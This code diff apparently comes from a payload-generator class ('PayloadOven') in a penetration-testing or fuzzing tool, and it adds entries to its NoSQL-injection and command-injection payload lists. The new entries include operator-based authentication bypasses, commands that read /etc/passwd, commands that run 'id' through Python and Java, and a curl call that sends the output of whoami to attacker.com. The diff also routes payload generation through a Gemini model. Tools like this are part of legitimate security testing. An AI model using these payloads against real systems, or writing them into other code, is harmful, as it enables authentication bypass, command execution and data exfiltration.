@@ -143,7 +143,12 @@ export class PayloadOven {
       elite: [
         "{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}",
         "|| 1==1",
-        "'; return true; //"
+        "'; return true; //",
+        "{\"$where\": \"this.password.match(/.*/)\"}",
+        "{\"$regex\": \".*\"}",
+        "admin' && this.password.length > 0 || 'a'=='b",
+        "{\"$gt\": \"\"}",
+        "{\"$exists\": true}"
       ]
     },
     'Command Injection': {
@@ -161,7 +166,12 @@ export class PayloadOven {
         "|| sleep 5",
         "; ping -c 5 127.0.0.1",
         "& ping -c 5 127.0.0.1",
-        "; timeout 5 /bin/sh"
+        "; timeout 5 /bin/sh",
+        "; {cat,/etc/passwd}",
+        "$(cat${IFS}/etc/passwd)",
+        "& curl http://attacker.com/$(whoami) &",
+        "; python -c 'import os; os.system(\"id\")'",
+        "'; java.lang.Runtime.getRuntime().exec(\"id\"); //"
       ]
     }
   };
@@ -195,9 +205,9 @@ export class PayloadOven {
       const res = await ai.models.generateContent({
         // FIX: was 'gemini-3.1-pro-preview' which is an invalid model string
         model: 'gemini-1.5-pro',
-        contents: prompt
+        contents: [{ role: 'user', parts: [{ text: prompt }] }]
       });
-      return res.text?.trim() || this.getPayloads(category, 1, 1)[0];
+      return res.response.text()?.trim() || this.getPayloads(category, 1, 1)[0];
     } catch (e) {
       return this.getPayloads(category, 1, 1)[0];
     }
